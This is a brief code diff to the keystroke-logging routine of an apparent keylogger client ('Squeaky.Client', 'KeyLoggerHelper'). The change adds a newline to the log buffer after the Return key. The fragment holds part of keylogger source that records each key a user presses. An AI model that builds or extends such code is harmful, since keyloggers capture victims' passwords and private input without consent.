@@ -58,8 +58,10 @@ namespace Squeaky.Client.Utilities
 
             if (!KeyLoggerHelper.IsExcludedKey(e.KeyCode) && !PressedKeys.Contains(e.KeyCode))
             {
+                var key = e.KeyCode.ToString();
+
                 PressedKeys.Add(e.KeyCode);
-                LogBuffer.Append($"[{e.KeyCode.ToString()}]");
+                LogBuffer.Append($"[{key}]{(key == "Return" ? "\n" : "" )}");
             }
         }
 
